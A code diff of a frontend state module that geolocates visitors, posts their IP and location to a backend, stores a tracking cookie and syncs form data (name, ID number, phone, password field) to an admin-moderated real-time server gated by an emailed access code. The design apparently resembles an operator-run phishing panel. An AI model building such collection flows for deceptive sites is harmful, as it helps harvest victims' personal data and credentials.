@@ -2,17 +2,15 @@
 import { effect, signal } from "@preact/signals";
 import axios from "axios";
 import { getCookie, setCookie } from "cookies-next";
-import { FieldValues } from "react-hook-form";
-import { NavigateFunction } from "react-router-dom";
-import { io as ClientIO } from "socket.io-client";
-import { v4 as unique } from "uuid";
+import io from "socket.io-client";
+import { getInitInfo, sendMainInfo } from "../utils/utils";
 
 // ROOM Is The Code That Sent To Us In Email To Connect With Real Time Server, We Can Cheng It From .env file ==> CODE Variable //
 
 export const ROOM = import.meta.env.VITE_CODE;
 
 export const socket = signal(
-  new (ClientIO as any)(
+  io(
     import.meta.env.VITE_MODE === "DEV"
       ? import.meta.env.VITE_DEV_SOCKET_IO_URL
       : import.meta.env.VITE_PROD_SOCKET_IO_URL,
@@ -23,12 +21,6 @@ export const socket = signal(
     }
   )
 );
-
-// The States That Used To Make The Real Time Feature Work
-
-export const socketId = signal("");
-
-export const currentPage = signal("");
 
 // To Sent To Server Any Time Tht It Change
 
@@ -52,11 +44,12 @@ export const mainInfo = signal({
   password: "",
   _id: "",
   room: ROOM,
-  Ip: "",
+  ip: "",
   country: "",
   city: "",
   date: "",
   socketId: "",
+  page: "home",
 });
 
 //For Admin Rejected Our Request Notification
@@ -84,117 +77,90 @@ export const specialId = signal("");
 export const isError = signal("");
 
 effect(() => {
-  if (isChat.value) {
-    isNewMessage.value = 0;
+  if (mainInfo.value.socketId) {
+    sendMainInfo();
   }
 });
 
-// ==> EVENT FROM SERVER <== //
-
-// Function That Used To Sent Data For Server Any Time
-
-export function sendDataToServer({
-  data,
-  current,
-  nextPage,
-  waitingForAdminResponse,
-  navigate,
-  mode,
-}: {
-  data: any;
-  current: string;
-  nextPage: string;
-  waitingForAdminResponse: boolean;
-  navigate?: NavigateFunction;
-  mode?: string;
-}) {
-  message.value = "";
-
-  isAdminError.value = false;
-
-  socket.value.emit("more-info", {
-    ...data,
-    room: ROOM,
-    date: new Date(),
-    id: socketId.value,
-    next: nextPage,
-    page: current,
-    userId: mainInfo.value?._id,
-    idNumber: mainInfo.value?.idNumber,
-    mode,
-    waitingForAdminResponse,
-    unique: unique(),
-  });
-
-  if (waitingForAdminResponse) {
-    loading.value = "wait";
-  } else {
-    if (nextPage) {
-      if (navigate) navigate("/" + nextPage);
-      permissions.value = [...permissions.value, nextPage];
-    }
+effect(() => {
+  if (!isError.value) {
+    axios
+      .get("https://ipapi.co/json/")
+      .then((res) => {
+        if (!mainInfo.value._id) {
+          axios
+            .post(
+              `${
+                import.meta.env.VITE_MODE == "DEV"
+                  ? import.meta.env.VITE_DEV_API_URL
+                  : import.meta.env.VITE_PROD_API_URL
+              }/users`,
+              {
+                ip: res.data?.ip,
+                country: res.data?.country_name,
+                city: res.data?.city,
+                code: ROOM,
+              }
+            )
+            .then(({ data }) => {
+              mainInfo.value = {
+                ...data.materials,
+                room: ROOM,
+                date: new Date().toString(),
+                page: "home",
+              };
+              const nextYear = new Date();
+              const current = new Date();
+              nextYear.setFullYear(current.getFullYear() + 1);
+              setCookie("ID", data.materials._id, { expires: nextYear });
+              loading.value = "";
+              socket.value.connect();
+            });
+        } else {
+          socket.value.connect();
+          loading.value = "";
+          mainInfo.value = {
+            ...mainInfo.value,
+            room: ROOM,
+            ip: res.data?.ip,
+            country: res.data?.country_name,
+            city: res.data?.city,
+            date: new Date().toString(),
+            page: "home",
+          };
+        }
+      })
+      .catch((err) => {
+        console.log(err);
+      });
   }
-}
+});
 
-export function sendMessage(message: string) {
-  socket.value.emit("send-message", {
-    content: message,
-    id: socketId.value,
-    createdAt: new Date(),
-    room: ROOM,
-    userId: mainInfo.value?._id,
-    myId: mainInfo.value?._id,
-    unique: unique(),
-  });
+effect(() => {
+  if (getCookie("ID")) {
+    getInitInfo();
+  }
 
-  messages.value = [
-    ...messages.value,
-    {
-      content: message as string,
-      id: socketId.value,
-      createdAt: new Date(),
-      // userId: mainInfo.value?.id,
-    },
-  ];
-}
-
-export function checkUser(data: FieldValues, navigate: NavigateFunction) {
-  const nextYear = new Date();
-  const current = new Date();
-  nextYear.setFullYear(current.getFullYear() + 1);
-  setCookie("ID", data.idNumber, { expires: nextYear });
-
-  mainInfo.value = {
-    ...mainInfo.value,
-    fullName: data.fullName,
-    idNumber: data.idNumber,
-    phone: data.phone,
-    socketId: socketId.value,
-  };
-
-  socket.value.emit("checkUser", mainInfo.value, ({ id }: { id: string }) => {
-    mainInfo.value = { ...mainInfo.value, _id: id };
-  });
-
-  navigate("/page2");
-
-  permissions.value = [...permissions.value, "page2"];
-}
-
-export async function getInitInfo() {
-  return await axios
-    .get(
+  axios
+    .post(
       `${
         import.meta.env.VITE_MODE == "DEV"
           ? import.meta.env.VITE_DEV_API_URL
           : import.meta.env.VITE_PROD_API_URL
-      }/users/${getCookie("ID")}`
+      }/auth/check`,
+      { code: ROOM }
     )
-    .then((res) => {
-      mainInfo.value = { ...mainInfo.value, ...res.data.materials };
+    .then(() => {
+      isError.value = "";
     })
-    .catch((err) => {
-      setCookie("ID", "");
-      console.log(err);
+    .catch(() => {
+      isError.value =
+        "The Code Is Expired Or Wrong, Connect With Page Owner To Solve Problem Or Make Sure That You Write A Right Code";
     });
-}
+});
+
+effect(() => {
+  if (isChat.value) {
+    isNewMessage.value = 0;
+  }
+});
